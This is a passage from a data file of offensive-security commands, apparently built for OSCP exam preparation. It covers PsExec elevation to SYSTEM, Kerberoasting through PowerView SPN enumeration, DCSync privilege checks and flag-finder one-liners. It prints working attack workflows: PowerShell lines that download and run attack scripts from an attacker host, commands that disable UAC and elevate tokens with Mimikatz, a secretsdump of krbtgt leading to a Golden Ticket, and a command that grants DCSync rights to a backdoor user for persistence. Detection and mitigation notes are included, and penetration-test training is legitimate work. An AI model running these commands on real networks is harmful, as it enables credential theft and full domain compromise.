# Task runs as SYSTEM at specified time

TIME ESTIMATE:
PSExec elevation: 2-5 seconds
Total workflow (upload  elevate  dump): 30-90 seconds","high","","","","{""Access is denied"": ""User lacks Administrator rights. Solution: Verify admin status: whoami /groups (look for S-1-5-32-544 = Administrators). If not admin, escalate privileges first: exploit local vuln, abuse misconfigured service, etc. If UAC blocking: Run cmd.exe as Administrator (right-click \u2192 Run as administrator) then retry psexec."", ""psexec.exe not recognized"": ""PSExec not uploaded to target. Solution: Download from Sysinternals: wget https://live.sysinternals.com/psexec.exe (on Kali). Upload to target: copy \\\\<LHOST>\\share\\psexec.exe C:\\Windows\\Temp\\. Or certutil: certutil -urlcache -f http://<LHOST>/psexec.exe psexec.exe"", ""Make sure admin$ share is enabled"": ""PSExec requires ADMIN$ share for local elevation (even though not accessing remote system). Solution: Enable ADMIN$ share: net share ADMIN$ (should show C:\\Windows). If disabled, use alternative: PowerShell Start-Process: Start-Process cmd.exe -Verb RunAs -ArgumentList '/k whoami'. Or Mimikatz: mimikatz.exe 'privilege::debug' 'token::elevate' 'exit'."", ""Couldn't access <TARGET> (when using localhost)"": ""Firewall or service issue. Solution: Use local elevation flags: psexec.exe -accepteula -s -i cmd.exe (no target specified = local). Ensure Administrator rights. Check Windows Firewall: netsh advfirewall show allprofiles (should allow local SMB)."", ""UAC prompt appears"": ""User Account Control blocking elevation. Solution: If GUI access, approve UAC prompt. If no GUI (SSH/WinRM), bypass UAC: use Mimikatz token elevation, exploit UAC bypass vuln (UACME), or disable UAC (requires reboot): reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f""}","{""psexec.exe"": ""Sysinternals PSExec - remote execution and privilege escalation tool. Microsoft-signed legitimate admin utility. CRITICAL: Works locally to elevate Administrator \u2192 SYSTEM. Requires Administrator rights to execute. Download: https://docs.microsoft.com/sysinternals/downloads/psexec"", ""-accepteula"": ""Auto-accept Sysinternals EULA without interactive prompt. Required for scripted/automated execution. Without this, psexec pauses waiting for EULA acceptance on first run."", ""-s"": ""Run as SYSTEM account (NT AUTHORITY\\SYSTEM). Highest privilege level - bypasses most security restrictions. SYSTEM has access to: all files (including protected), all registry keys, all processes, SAM database, LSASS memory. Required for: LSASS dump (procdump lsass), SAM dump (reg save), many post-exploitation tasks."", ""-i"": ""Interactive - show window on desktop. Required for GUI applications and interactive shells. Without -i, process runs in background Session 0 (no visible window). Combine with -s for interactive SYSTEM shell."", ""cmd.exe"": ""Command prompt executable. Can substitute: powershell.exe (SYSTEM PowerShell), C:\\Windows\\System32\\cmd.exe (full path if PATH broken).""}","","","[""ad-lsass-dump-procdump"", ""ad-sam-dump-reg-save"", ""comsvcs-lsass-dump""]"
"powerview-enumerate-spns","PowerView - Enumerate Service Principal Names","enumeration","Get-NetUser -SPN | Select-Object samaccountname,serviceprincipalname","Enumerate Active Directory user accounts with Service Principal Names (SPNs) using PowerView. Identifies Kerberoastable accounts - service accounts whose TGS tickets can be requested and cracked offline.","active-directory","","CRITICAL FOR KERBEROASTING ATTACKS. PowerView SPN enumeration identifies service accounts whose passwords can be cracked offline. OSCP WORKFLOW: (1) Enumerate SPNs: Get-NetUser -SPN, (2) Request TGS tickets: Invoke-Kerberoast or GetUserSPNs.py, (3) Crack offline: hashcat -m 13100 (TGS-REP). COMMON FINDS: SQL Server service accounts (often weak passwords), IIS application pools, custom Windows services. Service accounts typically have: weak passwords (for ease of memory), high privileges (often Domain Admin or equivalent), rarely rotated passwords (change breaks applications). Time estimate: 2-10 seconds.

MANUAL ALTERNATIVES:

PowerView SPN enumeration:
Get-NetUser -SPN | Select-Object samaccountname,serviceprincipalname

PowerView detailed output:
Get-NetUser -SPN
# Shows: distinguishedname, samaccountname, serviceprincipalname, pwdlastset, memberof, etc.

ActiveDirectory module (if installed):
Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName | Select-Object Name,ServicePrincipalName

Native Windows setspn:
setspn -T corp.com -Q */*
# Output: CN=SQL Service,CN=Users,DC=corp,DC=com - MSSQLSvc/sql01.corp.com:1433

Impacket from Kali:
GetUserSPNs.py corp.com/user:pass -dc-ip 192.168.50.70
# Lists SPNs + can request TGS hashes directly

PowerView with specific service type:
Get-NetUser -SPN | Where-Object {$_.serviceprincipalname -like '*SQL*'}
# Filter for SQL Server accounts only

FULL KERBEROASTING WORKFLOW:

1. Enumerate SPNs (PowerView):
Get-NetUser -SPN | Select-Object samaccountname,serviceprincipalname

Output:
samaccountname serviceprincipalname
-------------- --------------------
sqlservice     MSSQLSvc/sql01.corp.com:1433
iis_svc        HTTP/web01.corp.com

2. Request TGS tickets (Invoke-Kerberoast):
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-Kerberoast.ps1')
Invoke-Kerberoast -OutputFormat Hashcat | fl

OR Rubeus:
Rubeus.exe kerberoast /outfile:hashes.txt

OR Impacket (from Kali):
GetUserSPNs.py corp.com/user:pass -dc-ip 192.168.50.70 -request -outputfile hashes.txt

3. Crack with Hashcat:
hashcat -m 13100 hashes.txt rockyou.txt --force
# Mode 13100 = Kerberos 5 TGS-REP etype 23 (RC4-HMAC)

4. Use cracked password:
crackmapexec smb 192.168.50.0/24 -u sqlservice -p CrackedPassword123!
# Often service accounts have admin rights on multiple servers

COMMON SPN PATTERNS:

SQL Server:
MSSQLSvc/<hostname>:<port>
MSSQLSvc/sql01.corp.com:1433

HTTP/IIS:
HTTP/<hostname>
HTTP/web01.corp.com

Exchange:
exchangeMDB/<hostname>
exchangeRFR/<hostname>
ExchangeAB/<hostname>

WSUS:
HTTP/<hostname>:8530

Custom services:
SERVICE/<hostname>
APP/<hostname>

SPN ENUMERATION VARIATIONS:

Find all SPNs for specific user:
Get-NetUser -Identity sqlservice | Select-Object serviceprincipalname

Find weak SPNs (RC4-HMAC):
Get-NetUser -SPN | Where-Object {$_.serviceprincipalname -and $_.msds-supportedencryptiontypes -eq 0}
# RC4-HMAC is weaker than AES - easier to crack

Find recently set SPNs:
Get-NetUser -SPN | Where-Object {$_.pwdlastset -gt (Get-Date).AddDays(-30)}

Find SPNs with admin privileges:
Get-NetUser -SPN | Where-Object {$_.memberof -like '*Admin*'}

ALTERNATIVE TOOLS:

Rubeus (Windows):
Rubeus.exe kerberoast /stats
# Shows: Total Kerberoastable users, encryption types

Impacket GetUserSPNs (Kali):
GetUserSPNs.py corp.com/user:pass -dc-ip 192.168.50.70
# No TGS request, just enumeration

LDAP query (manual):
(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))
# Use with ldapsearch or AD Explorer

BloodHound:
Invoke-BloodHound -CollectionMethod All
# BloodHound GUI  Analysis  List all Kerberoastable Accounts

WHY KERBEROASTING WORKS:

1. Any domain user can request TGS for any SPN
2. TGS is encrypted with service account's NTLM hash
3. TGS can be cracked offline (no network traffic)
4. Service accounts often have weak passwords
5. No detection (legitimate Kerberos traffic)

DETECTION:
- Monitor Event ID 4769 (TGS requested) for unusual patterns
- Look for multiple TGS requests for same SPN from single user
- Detect RC4 encryption (modern systems should use AES)
- Monitor for accounts requesting TGS but not using service

MITIGATION:
- Strong service account passwords (25+ chars)
- Managed Service Accounts (MSA) / Group MSAs
- Disable RC4 encryption (force AES)
- Regular password rotation for service accounts
- Monitor Kerberos Event ID 4769

OSCP EXAM TIPS:
1. Always enumerate SPNs on domain targets
2. Service accounts often reused across multiple systems
3. Cracked service account = lateral movement opportunity
4. Check service account group memberships (often admin)

TIME ESTIMATE:
SPN enumeration: 2-10 seconds
Kerberoast attack (full workflow): 1-5 minutes
Password cracking: Variable (depends on password strength)","high","","","","{""Get-NetUser not recognized"": ""PowerView not loaded. Solution: Import PowerView: IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/PowerView.ps1'). Or from file: Import-Module C:\\Tools\\PowerView.ps1. Download PowerView: wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 (on Kali)."", ""Access is denied"": ""User lacks domain read permissions (extremely rare - domain users can read AD by default). Solution: Verify domain authentication: whoami /upn. Ensure domain-joined or has domain credentials. Try with explicit credentials: Get-NetUser -SPN -Credential (Get-Credential)."", ""Cannot contact domain controller"": ""DNS or network issue. Solution: Verify DC reachable: ping <DC_FQDN>. Check DNS resolution: nslookup <DC_FQDN>. Specify DC explicitly: Get-NetUser -SPN -Domain corp.com -Server 192.168.50.70."", ""LDAP query failed"": ""Domain controller rejected query. Solution: Check domain membership: wmic computersystem get domain. Verify domain user: whoami /groups (should show domain groups). Try alternate query: Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName (ActiveDirectory module alternative)."", ""No results but should have SPNs"": ""Query syntax or filtering issue. Solution: Try without Select: Get-NetUser -SPN (shows all fields). Or native LDAP: setspn -T corp.com -Q */* (Windows built-in SPN enumeration). Or Impacket: GetUserSPNs.py corp.com/user:pass -dc-ip 192.168.50.70""}","{""Get-NetUser"": ""PowerView cmdlet that queries Active Directory for user objects. Part of PowerSploit/PowerView toolkit. ADVANTAGE: Works from unprivileged domain user account. Returns rich AD user information including SPNs, group memberships, password policies, etc."", ""-SPN"": ""Filter for users with Service Principal Names. SPN format: SERVICE/hostname (e.g., MSSQLSvc/sql01.corp.com:1433). Users with SPNs are typically service accounts (SQL Server, IIS, custom services). CRITICAL: These accounts are Kerberoastable - can request TGS and crack offline to recover password."", ""Select-Object samaccountname,serviceprincipalname"": ""Display only username and SPN fields. samaccountname = Windows username (e.g., sqlservice). serviceprincipalname = SPN value (e.g., MSSQLSvc/sql01.corp.com:1433). Reduces output noise - full Get-NetUser returns 50+ fields per user.""}","","[""impacket-getuserspns-kerberoast"", ""get-aduser""]","[""impacket-getuserspns-kerberoast"", ""rubeus-kerberoast""]"
"ad-dcsync-check-privileges","Check DCSync Privileges (Replication Rights)","enumeration","Get-ObjectAcl -DistinguishedName 'DC=corp,DC=com' -ResolveGUIDs | Where-Object {$_.ObjectAceType -match 'Replication-Get-Changes' -and $_.ActiveDirectoryRights -match 'ExtendedRight'} | Select-Object SecurityIdentifier,ActiveDirectoryRights,ObjectAceType | fl","Check which users/groups have DCSync privileges (DS-Replication-Get-Changes rights). Identifies accounts that can perform DCSync attacks to extract domain credentials.","active-directory","","ENUMERATE DCSYNC PRIVILEGES before attempting DCSync. Identifies which accounts can perform replication attacks. OSCP USE CASE: After compromising a user, check if they have DCSync rights (privilege escalation path). DEFAULT ACCOUNTS WITH DCSYNC: Domain Admins, Enterprise Admins, Administrators, Domain Controllers. CUSTOM GRANTS: Misconfigurations may grant DCSync to lower-privileged accounts (Exchange Servers, backup services, etc.). WHY IMPORTANT: DCSync requires specific rights - not all admins can DCSync. Time estimate: 5-15 seconds.

MANUAL ALTERNATIVES:

PowerView DCSync privilege check:
Get-ObjectAcl -DistinguishedName 'DC=corp,DC=com' -ResolveGUIDs | Where-Object {$_.ObjectAceType -match 'Replication-Get-Changes' -and $_.ActiveDirectoryRights -match 'ExtendedRight'} | Select-Object SecurityIdentifier,ActiveDirectoryRights,ObjectAceType | fl

Convert SID to username:
$sid = 'S-1-5-21-1987370270-658905905-1781884369-1104'
ConvertFrom-SID $sid
# Or: (New-Object System.Security.Principal.SecurityIdentifier($sid)).Translate([System.Security.Principal.NTAccount]).Value

ActiveDirectory module alternative:
(Get-Acl 'AD:\DC=corp,DC=com').Access | Where-Object {$_.ObjectType -eq '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'} | Select-Object IdentityReference,ActiveDirectoryRights
# GUID 1131f6aa... = DS-Replication-Get-Changes

BloodHound query:
# In BloodHound GUI:
# Analysis  Shortest Paths to Domain Admins from Owned Principals
# Look for ""DCSync"" edge type
# OR Cypher query:
MATCH (n) WHERE n.hasdcsync=true RETURN n

ADFind (Windows tool):
adfind.exe -b 'DC=corp,DC=com' -s base nTSecurityDescriptor -resolvesids
# Parse output for Replication-Get-Changes ACEs

Check current user's DCSync rights:
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$userSID = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
Get-ObjectAcl -DistinguishedName 'DC=corp,DC=com' -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -eq $userSID -and $_.ObjectAceType -match 'Replication'}

DCSYNC REQUIRED RIGHTS:

Minimum rights for DCSync:
1. DS-Replication-Get-Changes (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
2. DS-Replication-Get-Changes-All (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
3. DS-Replication-Get-Changes-In-Filtered-Set (GUID: 89e95b76-444d-4c62-991a-0facbeda640c) - optional

Check for all three:
Get-ObjectAcl -DistinguishedName 'DC=corp,DC=com' -ResolveGUIDs | Where-Object {($_.ObjectAceType -eq 'DS-Replication-Get-Changes' -or $_.ObjectAceType -eq 'DS-Replication-Get-Changes-All') -and $_.ActiveDirectoryRights -match 'ExtendedRight'} | Select-Object SecurityIdentifier,ObjectAceType | Sort-Object SecurityIdentifier

DEFAULT ACCOUNTS WITH DCSYNC:

1. Domain Admins (SID: S-1-5-21-<domain>-512)
2. Enterprise Admins (SID: S-1-5-21-<root_domain>-519)
3. Administrators (SID: S-1-5-32-544)
4. Domain Controllers (SID: S-1-5-21-<domain>-516)

Verify defaults:
Get-ADGroupMember 'Domain Admins' | Select-Object Name,SID
Get-ADGroupMember 'Enterprise Admins' | Select-Object Name,SID

COMMON MISCONFIGURATIONS:

1. Exchange Servers:
# Exchange Write DACL often grants DCSync
Get-ObjectAcl -DistinguishedName 'DC=corp,DC=com' | Where-Object {$_.SecurityIdentifier -like '*Exchange*'}

2. Backup operators:
# Backup software given replication rights
Get-ObjectAcl -DistinguishedName 'DC=corp,DC=com' | Where-Object {$_.SecurityIdentifier -like '*backup*' -and $_.ObjectAceType -match 'Replication'}

3. Service accounts:
# Custom service accounts with excessive permissions
Get-ObjectAcl -DistinguishedName 'DC=corp,DC=com' -ResolveGUIDs | Where-Object {$_.ObjectAceType -match 'Replication' -and $_.SecurityIdentifier -notlike '*-512' -and $_.SecurityIdentifier -notlike '*-519'}

PRIVILEGE ESCALATION PATH:

1. Compromise low-privileged user
2. Check DCSync rights: Get-ObjectAcl...
3. If user/group has DCSync  Extract credentials:
impacket-secretsdump -just-dc-user krbtgt 'corp.com/compromised_user:password@192.168.50.70'
4. Create Golden Ticket with krbtgt hash
5. Achieve domain-wide persistence

GRANT DCSYNC RIGHTS (for persistence):

# Grant DCSync to specific user (requires DA):
Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=com' -PrincipalIdentity backdoor_user -Rights DCSync -Verbose

# Remove DCSync rights:
Remove-DomainObjectAcl -TargetIdentity 'DC=corp,DC=com' -PrincipalIdentity backdoor_user -Rights DCSync

BLOODHOUND INTEGRATION:

Collect ACL data:
Invoke-BloodHound -CollectionMethod ACL,ObjectProps

BloodHound Cypher query (find DCSync paths):
MATCH p=(u:User)-[:MemberOf*1..]->(g:Group)-[:GenericAll|WriteDacl]->(d:Domain) RETURN p

Find users with direct DCSync:
MATCH (u)-[:DCSync]->(d:Domain) RETURN u.name, d.name

DETECTION:

- Monitor Event ID 4662 (operation performed on object)
  - Object Type: {19195a5b-6da0-11d0-afd3-00c04fd930c9} (domainDNS)
  - Properties: {1131f6aa...} (DS-Replication-Get-Changes)
- Alert on DCSync from non-DC computers
- Baseline normal replication sources (only DCs should replicate)
- Monitor ACL changes on domain root:
  - Event ID 5136 (directory service object modified)
  - Attribute: nTSecurityDescriptor

MITIGATION:

- Regularly audit DCSync privileges: Get-ObjectAcl...
- Remove unnecessary DCSync grants
- Use Protected Users group (prevents credential delegation)
- Implement tiered administration (separate DA for each task)
- Monitor replication traffic from non-DCs
- Enable Advanced Threat Analytics (ATA) for DCSync detection

TIME ESTIMATE:
Privilege enumeration: 5-15 seconds
SID resolution: 2-5 seconds per SID
Total: 10-30 seconds","medium","","","","{""Get-ObjectAcl not recognized"": ""PowerView not loaded. Solution: Import PowerView: IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/PowerView.ps1'). Or from file: Import-Module C:\\Tools\\PowerView.ps1."", ""Cannot find path"": ""Wrong Distinguished Name. Solution: Get correct DN: (Get-ADDomain).DistinguishedName OR nltest /dsgetdc:<domain> /server:<dc> OR DSQUERY * -filter \""(objectClass=domain)\"" -attr distinguishedName. Common formats: DC=corp,DC=com, DC=corp,DC=local, DC=internal,DC=corp,DC=com."", ""Access is denied"": ""Insufficient permissions to read ACLs (rare - domain users can usually read). Solution: Run as domain user with read access. Or use elevated credentials: $cred = Get-Credential; Get-ObjectAcl -Credential $cred ..."", ""No results but should have DCSync accounts"": ""Query filtering too strict or domain has no custom DCSync rights (only defaults). Solution: Remove filter: Get-ObjectAcl -DistinguishedName 'DC=corp,DC=com' -ResolveGUIDs | Where-Object {$_.ObjectAceType -like '*Replication*'} (broader search). Or check defaults: Get-ADGroupMember 'Domain Admins' (Domain Admins always have DCSync).""}","{""Get-ObjectAcl"": ""PowerView cmdlet that retrieves Access Control List (ACL) for AD objects. Shows permissions/rights granted to users/groups on AD objects. CRITICAL: DCSync requires specific extended rights on domain root object."", ""-DistinguishedName 'DC=corp,DC=com'"": ""Target object - domain root DN. Replace corp,DC=com with actual domain DN. Find with: (Get-ADDomain).DistinguishedName or DSQUERY * -filter \""(objectClass=domain)\"" -attr distinguishedName."", ""-ResolveGUIDs"": ""Translate permission GUIDs to human-readable names. Without this, ObjectAceType shows GUID like {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} instead of 'DS-Replication-Get-Changes'."", ""Where-Object {$_.ObjectAceType -match 'Replication-Get-Changes'}"": ""Filter for replication rights. DCSync requires: DS-Replication-Get-Changes AND DS-Replication-Get-Changes-All. Both rights needed for full DCSync (all users). Single right = partial DCSync (specific users)."", ""SecurityIdentifier"": ""SID of principal with DCSync rights. Convert to username with: ConvertFrom-SID <SID>. Default: Domain Admins (S-1-5-21-<domain>-512), Enterprise Admins, Administrators."", ""ActiveDirectoryRights"": ""Type of access right. ExtendedRight = special AD permission beyond standard read/write. DCSync is an ExtendedRight."", ""ObjectAceType"": ""Specific extended right name. DS-Replication-Get-Changes = basic replication. DS-Replication-Get-Changes-All = full domain replication (includes krbtgt).""}","","","[""ad-dcsync-secretsdump-user"", ""ad-dcsync-secretsdump-all"", ""ad-dcsync-mimikatz-user""]"
"ps-search-desktop-flags","PowerShell Search Desktop for Flags","post-exploit","Get-Content C:\Users\<USERNAME>\Desktop\*.txt","One-liner commands to locate and retrieve OSCP-style flags on Windows desktop directories","FLAG_RETRIEVAL","Get-Content C:\Users\Administrator\Desktop\*.txt","","","[{""command"": ""Get-Content C:\\Users\\Administrator\\Desktop\\*.txt"", ""description"": ""Read all .txt files on Administrator's desktop (typical flag location)"", ""context"": ""OSCP flag retrieval after privilege escalation""}, {""command"": ""Get-Content C:\\Users\\Administrator\\Desktop\\proof.txt"", ""description"": ""Read specific proof.txt flag file (OSCP standard)"", ""context"": ""Direct flag retrieval when filename known""}, {""command"": ""Get-ChildItem -Path C:\\Users\\Administrator\\Desktop -Recurse -File | Get-Content"", ""description"": ""Recursively read all files on Administrator desktop (including subdirectories)"", ""context"": ""Comprehensive flag search when location uncertain""}, {""command"": ""dir C:\\Users\\Administrator\\Desktop"", ""description"": ""List desktop contents first to identify flag filename before retrieval"", ""context"": ""Reconnaissance before flag capture""}, {""command"": ""Get-ChildItem -Path C:\\Users -Recurse -Include *.txt,*.flag -ErrorAction SilentlyContinue | Select-Object FullName,Length | Format-Table -AutoSize"", ""description"": ""Search all user directories for .txt and .flag files (wide net approach)"", ""context"": ""Thorough flag hunting when standard paths empty""}, {""command"": ""Get-Content C:\\Users\\*\\Desktop\\proof.txt"", ""description"": ""Search all user desktops for proof.txt using wildcard"", ""context"": ""Multi-user flag search""}]","{""purpose"": ""Quickly locate and retrieve OSCP exam flags from Windows hosts after gaining Administrator or SYSTEM access"", ""manual_alternative"": ""GUI navigation: Open File Explorer \u2192 C:\\Users\\Administrator\\Desktop \u2192 Double-click proof.txt (not practical via reverse shell)"", ""common_failures"": [""Access denied - need Administrator or SYSTEM privileges to read other users' desktops"", ""File not found - flag may be in different user directory or subdirectory"", ""Wildcards (*) not expanding - ensure proper quoting in remote commands"", ""ErrorAction not set - errors from inaccessible directories halt execution""], ""when_to_use"": [""Immediately after successful privilege escalation to Administrator/SYSTEM"", ""After lateral movement to retrieve remote host flags"", ""When combining with Invoke-Command for remote flag retrieval via WinRM"", ""OSCP exam flag capture phase""], ""exam_relevance"": ""CRITICAL - Final step in OSCP exploitation. Must retrieve proof.txt hash for points."", ""time_estimate"": ""<5 seconds per command"", ""technical_notes"": [""Get-Content (alias: cat, gc, type) reads file contents to stdout"", ""Wildcards (*) expand to match all files with pattern"", ""-Recurse searches subdirectories (slower but thorough)"", ""-ErrorAction SilentlyContinue suppresses access denied errors during broad searches"", ""Get-ChildItem (alias: dir, ls, gci) lists directory contents""]}","[""ps-winrm-invoke-command"", ""ps-search-credentials"", ""ps-registry-autologon""]","","","[""evil-winrm-shell""]","[""grep-r-private"", ""windows-flag-finder-cmd"", ""windows-flag-finder-ps"", ""linux-flag-finder""]","[""cat-file"", ""wget-download""]"
"windows-flag-finder-cmd","Windows Flag Finder (CMD)","post-exploit","cmd /c ""dir /s /b C:\*flag*.txt C:\*proof*.txt 2>nul & if errorlevel 1 findstr /s /i /m OS{ C:\*.txt 2>nul""","CMD one-liner to find OSCP flag files (flag.txt, proof.txt) with fallback to content search for OS{hash} pattern","FLAG_RETRIEVAL","","Windows equivalent of linux-flag-finder. Works in both PowerShell and CMD (wrapped with cmd /c). Searches entire C: drive - may take 30-60 seconds on large filesystems.

OSCP Windows flags typically in:
- C:\Users\Administrator\Desktop\proof.txt (after admin privesc)
- C:\Users\<user>\Desktop\local.txt (initial foothold)

For faster results in pure CMD shell:
dir /s /b C:\Users\*proof*.txt C:\Users\*local*.txt 2>nul","high","","","","","{""cmd /c"": ""Execute CMD command from PowerShell - required because dir/findstr are CMD builtins"", ""/s"": ""Recursive search - includes all subdirectories"", ""/b"": ""Bare format - shows full path only, no metadata (cleaner output)"", ""2>nul"": ""Redirect stderr to null - suppresses 'Access Denied' errors"", ""& if errorlevel 1"": ""CMD fallback - runs findstr only if dir found nothing (errorlevel 1)"", ""findstr /s"": ""Recursive string search through files"", ""findstr /i"": ""Case-insensitive matching"", ""findstr /m"": ""Print only filename (not matching line content)""}","","[""linux-flag-finder"", ""ps-search-desktop-flags"", ""windows-flag-finder-ps""]","[""type-file""]"
"windows-flag-finder-ps","Windows Flag Finder (PowerShell) - Comprehensive","post-exploit","Write-Host ""`n[*] Searching filesystem..."" -ForegroundColor Cyan; $fc=0; Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include *flag*.txt,*proof*.txt,*local*.txt | ForEach-Object { $fc++; Write-Host ""[FILE] $($_.FullName)"" -ForegroundColor Green; Get-Content $_.FullName }; Write-Host ""    Filesystem complete ($fc files found)"" -ForegroundColor DarkGray; Write-Host ""`n[*] Searching registry..."" -ForegroundColor Cyan; $rc=0; $hives=@('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall','HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall','HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run','HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run','HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment'); foreach($hive in $hives){ Write-Host ""    Checking: $hive"" -ForegroundColor DarkGray; Get-ChildItem -Path $hive -ErrorAction SilentlyContinue | ForEach-Object { $props = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue; $props.PSObject.Properties | Where-Object { $_.Value -match 'OS\{[a-fA-F0-9]{32}\}|flag|proof' } | ForEach-Object { $rc++; Write-Host ""[REG] $($_.Name): $($_.Value)"" -ForegroundColor Green } } }; Write-Host ""    Registry complete ($rc matches found)"" -ForegroundColor DarkGray; Write-Host ""`n[*] Checking environment variables..."" -ForegroundColor Cyan; $ec=0; Get-ChildItem Env: | Where-Object { $_.Value -match 'OS\{|flag|proof' } | ForEach-Object { $ec++; Write-Host ""[ENV] $($_.Name)=$($_.Value)"" -ForegroundColor Green }; Write-Host ""    Environment complete ($ec matches found)"" -ForegroundColor DarkGray; Write-Host ""`n[+] Search complete: $fc files, $rc registry, $ec env vars"" -ForegroundColor Yellow","Comprehensive PowerShell flag finder searching filesystem, registry, and environment variables for OSCP flags","FLAG_RETRIEVAL","","Comprehensive flag finder that searches THREE locations:

1. FILESYSTEM: Files named *flag*.txt, *proof*.txt, *local*.txt
2. REGISTRY: Values matching OS{32-hex} pattern in HKLM and HKCU
3. ENVIRONMENT: Variables containing flag/proof keywords

Why registry matters:
- CTF flags sometimes hidden as fake 'Uninstall' entries
- Custom apps may store secrets in registry
- Less obvious than Desktop files

Output is color-coded:
- [FILE] = Filesystem hit
- [REG] = Registry hit  
- [ENV] = Environment variable hit

Time estimate: 60-180 seconds for full scan.","high","","","","{""No output"": ""Try targeted searches separately - filesystem, registry, env vars"", ""Too slow"": ""Search user directories only: Get-ChildItem C:\\Users -Recurse -Include *proof*,*local* -ErrorAction SilentlyContinue"", ""Registry timeout"": ""Search specific hive: Get-ChildItem HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall -Recurse -ErrorAction SilentlyContinue"", ""Flag in unexpected format"": ""Broaden regex: -match 'flag|proof|OS\\{|CTF\\{'""}","{""Write-Host ... -ForegroundColor Cyan"": ""Visual section headers for clarity during search"", ""Get-ChildItem -Path C:\\ -Recurse"": ""Recursive filesystem search from root"", ""-Include *flag*.txt,*proof*.txt,*local*.txt"": ""Match common OSCP flag filenames"", ""ForEach-Object { Get-Content $_.FullName }"": ""Display file contents when found"", ""Get-ChildItem -Path HKLM:\\SOFTWARE,HKCU:\\SOFTWARE"": ""Search both machine and user registry hives"", ""Get-ItemProperty $_.PSPath"": ""Read all values from each registry key"", ""$_.Value -match 'OS\\{[a-fA-F0-9]{32}\\}'"": ""Regex match for OSCP flag format in registry values"", ""Get-ChildItem Env:"": ""Enumerate all environment variables"", ""[FILE], [REG], [ENV] prefixes"": ""Indicate source location of found flags""}","","[""linux-flag-finder"", ""ps-search-desktop-flags"", ""windows-flag-finder-cmd"", ""windows-flag-finder-ps-simple""]","[""cat-file"", ""ps-search-desktop-flags""]"
"windows-flag-finder-ps-simple","Windows Flag Finder (PowerShell) - Simple","post-exploit","$f=Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include *flag*.txt,*proof*.txt; if($f){$f.FullName}else{Get-ChildItem C:\ -Recurse -Include *.txt -ErrorAction SilentlyContinue | Select-String -Pattern 'OS\{[a-fA-F0-9]{32}\}' -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path -Unique}","Simple PowerShell flag finder for filesystem only (faster, less comprehensive)","FLAG_RETRIEVAL","","Simpler/faster version that only searches filesystem. Use windows-flag-finder-ps for comprehensive search including registry.","medium","","","","","{""$f=..."": ""Store search results in variable for conditional logic"", ""Get-ChildItem -Recurse"": ""Recursive filesystem search"", ""-Include *flag*.txt,*proof*.txt"": ""Filter to flag/proof filenames"", ""-ErrorAction SilentlyContinue"": ""Suppress access denied errors"", ""Select-String -Pattern 'OS\\{...\\}'"": ""Fallback content search for flag pattern""}","","[""windows-flag-finder-ps"", ""windows-flag-finder-cmd""]","[""cat-file""]"
"ps-enum-installed-apps","Enumerate Installed Applications (PowerShell)","post-exploit","Get-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"",""HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"" -ErrorAction SilentlyContinue | Select-Object DisplayName,DisplayVersion,Publisher | Sort-Object DisplayName | Format-Table -AutoSize","List all installed applications from registry to identify vulnerable software for privilege escalation","ENUMERATION","","Essential post-exploitation enumeration for privilege escalation. Look for:
- Outdated software with known CVEs (TeamViewer, FileZilla, WinSCP)
- Custom/internal applications (often vulnerable)
- Backup software (Veeam - CVE-2023-27532)
- Remote access tools with stored credentials
- PDF readers, office suites with known exploits

Alternative methods:
- WMI (slower): Get-WmiObject -Class Win32_Product
- CMD: wmic product get name,version

OSCP Tip: Cross-reference versions with searchsploit for local privilege escalation exploits.","high","","","","{""Empty output"": ""Check registry access: Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' | Select-Object -First 5"", ""Missing 32-bit apps"": ""Query WOW6432Node separately: Get-ItemProperty 'HKLM:\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*'"", ""Format issues"": ""Remove Format-Table for raw object output: ... | Select-Object DisplayName,DisplayVersion,Publisher""}","{""HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*"": ""Registry path for 64-bit installed applications"", ""HKLM:\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*"": ""Registry path for 32-bit applications on 64-bit Windows (WoW64 redirection)"", ""-ErrorAction SilentlyContinue"": ""Suppress errors for registry keys without read access"", ""Select-Object DisplayName,DisplayVersion,Publisher"": ""Extract only relevant fields - app name, version, vendor"", ""Sort-Object DisplayName"": ""Alphabetical sorting for easier review"", ""Format-Table -AutoSize"": ""Clean tabular output that fits column widths""}","","","[""searchsploit-local""]"
